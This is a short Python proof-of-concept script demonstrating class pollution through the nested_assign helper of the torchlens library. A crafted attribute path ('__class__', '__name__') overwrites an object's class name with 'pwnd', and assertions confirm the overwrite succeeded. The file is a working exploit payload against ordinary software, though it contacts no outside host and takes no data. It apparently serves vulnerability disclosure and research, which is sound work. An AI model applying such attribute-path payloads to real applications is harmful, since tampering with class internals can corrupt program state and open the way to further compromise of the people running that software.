# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: nested_assign
# Type: get-both-set-both

from torchlens.helper_funcs import nested_assign

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = [("attr", "__class__"), ("attr", "__name__")]

def run_poc():
  nested_assign(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
